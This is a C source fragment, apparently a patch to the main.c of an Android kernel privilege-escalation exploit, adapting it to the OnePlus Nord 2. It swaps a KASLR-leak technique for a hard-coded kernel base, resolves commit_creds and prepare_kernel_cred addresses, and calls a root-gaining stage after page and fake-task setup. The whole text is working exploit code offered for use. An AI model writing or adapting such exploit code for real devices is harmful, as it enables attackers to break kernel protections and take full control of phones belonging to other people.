/* main.c modification for OnePlus Nord 2
 * 
 * This file shows the key changes needed to bypass pselect slide
 * and use direct KASLR setting from kallsyms
 */

/* Add this function to main.c */

/* Set KASLR base directly from known kernel base
 * This bypasses the pselect slide technique which doesn't work on this device
 */
int set_kaslr_base_direct(void) {
  /* Use the actual kernel base from kallsyms */
  kaslr_base = ACTUAL_KERNEL_BASE;
  kaslr_slide = kaslr_base - KIMAGE_TEXT_BASE;
  
  pr_success("kaslr-direct pid=%d base=%016llx slide=%016llx\n",
             getpid(), (unsigned long long)kaslr_base,
             (unsigned long long)kaslr_slide);
  
  pr_info("Using direct KASLR base from kallsyms\n");
  pr_info("Kernel base: 0x%016llx\n", (unsigned long long)kaslr_base);
  pr_info("KIMAGE_TEXT_BASE: 0x%016llx\n", (unsigned long long)KIMAGE_TEXT_BASE);
  pr_info("KASLR slide: 0x%016llx\n", (unsigned long long)kaslr_slide);
  
  /* Verify key addresses */
  uintptr_t commit_creds = kaslr_image_addr(COMMIT_CREDS_IMAGE);
  uintptr_t prepare_cred = kaslr_image_addr(PREPARE_KERNEL_CRED_IMAGE);
  
  pr_info("commit_creds: 0x%016llx\n", (unsigned long long)commit_creds);
  pr_info("prepare_kernel_cred: 0x%016llx\n", (unsigned long long)prepare_cred);
  
  return 1;
}

/* Modified main function - replace slide_leak_kernel_base() call */
int main(int argc, char **argv) {
  (void)argc;
  (void)argv;
  
  if (!init_direct_root_cpu()) {
    pr_error("runtime performance CPU detection failed errno=%d\n", errno);
    return 1;
  }
  log_startup_context();

  pin_to_core(CORE);
  
#if defined(USE_DIRECT_KASLR)
  /* Use direct KASLR base from kallsyms (for Nord 2) */
  if (!set_kaslr_base_direct()) {
    pr_error("direct kaslr setup failed\n");
    return 1;
  }
#else
  /* Use pselect slide technique (original aristotle method) */
  if (!slide_leak_kernel_base()) {
    pr_error("slide kaslr leak failed\n");
    return 1;
  }
#endif

  /* Rest of the code remains the same */
  close_reclaim_sockets();
  cleanup_page_prepare_state();
  page_base = 0;
  fake_lock = 0;
  fake_w0 = 0;
  fake_task = 0;
  pr_info("slide generation released before direct stage\n");

  return run_direct_root_stage() ? 0 : 2;
}
